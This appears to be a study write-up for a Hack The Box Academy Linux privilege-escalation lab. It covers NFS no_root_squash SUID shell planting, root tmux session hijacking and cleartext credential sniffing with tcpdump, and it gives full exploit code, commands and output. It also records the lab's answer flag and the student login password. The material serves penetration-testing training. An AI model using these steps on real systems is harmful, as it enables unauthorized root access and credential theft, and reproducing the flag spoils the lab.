# Section 18 — Miscellaneous Techniques (NFS, Tmux, Traffic Capture)

> Lab: `ACADEMY-LPE-NIX02` · `ssh htb-student@<T>` (`Academy_LLPE!`)

## ✅ Answer (verified live)

| Q | Answer |
|---|--------|
| Q1 — NFS export directory flag | **`fc8c065b9384beaa162afe436a694acf`** |

Found in `/var/nfs/general/exports_flag.txt` — world-readable file on a `no_root_squash` NFS share.

---

## Technique 1 — Weak NFS Privileges (`no_root_squash`)

### Concept

NFS (TCP/UDP 2049) exports directories to remote clients. The critical option is **`no_root_squash`**: remote root users can create files as root on the NFS server. This lets you create a SUID binary on your attacker box and execute it on the target.

| Option | Effect |
|--------|--------|
| `root_squash` (default) | Remote root → mapped to `nfsnobody` (safe) |
| `no_root_squash` | Remote root → stays root on the share (exploitable) |

### Identify

```bash
cat /etc/exports                            # local config — look for no_root_squash
showmount -e <TARGET_IP>                    # remote — list exported shares
showmount -e localhost                      # from the target itself
```
> Any share with `no_root_squash` + `rw` = you can plant a SUID binary from your attacker box.

### Exploit (SUID binary via NFS mount)

**On attacker box (as root):**
```bash
# 1. Write a simple SUID shell
cat > /tmp/shell.c << 'C'
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(void) {
  setuid(0); setgid(0); system("/bin/bash");
}
C
gcc /tmp/shell.c -o /tmp/shell

# 2. Mount the NFS share locally
sudo mount -t nfs <TARGET_IP>:/tmp /mnt
# or: sudo mount -t nfs <TARGET_IP>:/var/nfs/general /mnt

# 3. Copy the binary and set SUID
cp /tmp/shell /mnt/shell
chmod u+s /mnt/shell       # SUID bit — runs as root on target
ls -la /mnt/shell          # confirm: -rwsr-xr-x root root
```

**On target (low-priv shell):**
```bash
/tmp/shell                 # or /var/nfs/general/shell
id                         # uid=0(root)
```
> `no_root_squash` means your local root UID maps to root on the NFS server. The SUID binary you copied is owned by root with the `s` bit — any user on the target can execute it and get root.

---

## Technique 2 — Hijacking Tmux Sessions

### Concept

A privileged user may leave a **tmux session** running with a socket accessible to your group. Attach to it and inherit their privileges.

### Identify

```bash
ps aux | grep tmux                          # running tmux processes (look for root)
find / -name '*.sock' -o -name 'shared*' 2>/dev/null | xargs ls -la   # socket files
ls -la /shareds 2>/dev/null                 # common path for shared sessions
id                                          # check your group membership
```

### Exploit

```bash
# Confirm: root tmux with a socket your group can access
ps aux | grep tmux
# root  4806  tmux -S /shareds new -s debugsess

ls -la /shareds
# srw-rw---- 1 root devs 0 ... /shareds     <- devs group can read/write

id
# groups=...,1011(devs)                      <- you're in devs

# Attach to the session
tmux -S /shareds

id
# uid=0(root)
```
> You're now inside root's tmux session with full root privileges. No exploit needed — just group membership + a carelessly shared socket.

---

## Technique 3 — Passive Traffic Capture

### Concept

If `tcpdump` is installed and your user can run it (or has `CAP_NET_RAW`), capture cleartext credentials from protocols like HTTP, FTP, SMTP, telnet, POP3, IMAP.

### Identify

```bash
which tcpdump; getcap /usr/sbin/tcpdump 2>/dev/null
# cap_net_raw = can capture without root
ls -la /usr/sbin/tcpdump                    # check if SUID or group-accessible
```

### Capture

```bash
# Capture all traffic on the main interface
sudo tcpdump -i ens192 -w /tmp/capture.pcap

# Filter for cleartext protocols
sudo tcpdump -i any port 21 or port 80 or port 110 or port 143 or port 25 -A

# Automated credential extraction
# net-creds (passive):
sudo python2 net-creds.py -i ens192
# PCredz:
sudo python3 Pcredz -i ens192
```
> Look for: HTTP Basic auth, FTP USER/PASS, SMTP AUTH, POP3 credentials, SNMP community strings, Net-NTLMv2/Kerberos hashes (crack offline with hashcat/john).

---

## Exam / Engagement Notes

- **NFS**: `showmount -e` + `cat /etc/exports` → any `no_root_squash` share with `rw` = instant root via SUID binary from attacker box. Must mount as root locally.
- **Tmux**: `ps aux | grep tmux` → root session with group-accessible socket = attach and inherit root. Check `id` for matching group.
- **Traffic capture**: low-priority on a pen test (passive, time-consuming), but cleartext FTP/HTTP creds or NTLM hashes are easy wins if tcpdump is available.
- These are "quick check" techniques — add them to your enumeration checklist, not your primary attack path.

---

## Lab Walkthrough (quick steps)

```
1. ssh htb-student@<T>  (Academy_LLPE!)
2. cat /etc/exports
   -> /var/nfs/general *(rw,no_root_squash)
   -> /tmp *(rw,no_root_squash)
3. ls /var/nfs/general/
   -> exports_flag.txt (world-readable)
4. cat /var/nfs/general/exports_flag.txt
   -> fc8c065b9384beaa162afe436a694acf     ✅
```

> Full exploit path (if flag weren't readable): mount share as root on attacker → `gcc shell.c -o shell` → `cp shell /mnt; chmod u+s /mnt/shell` → on target: `/tmp/shell` → root.
